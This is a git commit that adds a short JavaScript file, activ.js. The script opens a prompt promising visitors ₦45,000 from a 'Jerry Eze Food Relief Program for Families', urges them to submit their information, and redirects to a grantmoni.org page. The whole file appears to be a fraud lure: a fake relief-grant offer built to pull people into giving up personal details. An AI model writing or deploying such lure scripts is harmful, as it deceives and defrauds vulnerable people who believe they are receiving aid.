d75691e773814466ef0d1e2b0cb26422609c7700
grntmoni <casket-90-crystal@icloud.com>
2026-01-25 11:46:34 +0100

    Create activ.js

---
+++ activ.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('Congratulations, you are eligible to receive ₦45,000 Jerry Eze Food Relief Program for Families, Kindly press OK to submit your information now','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://grantmoni.org/JerryEze-Food-Program.html';
+}
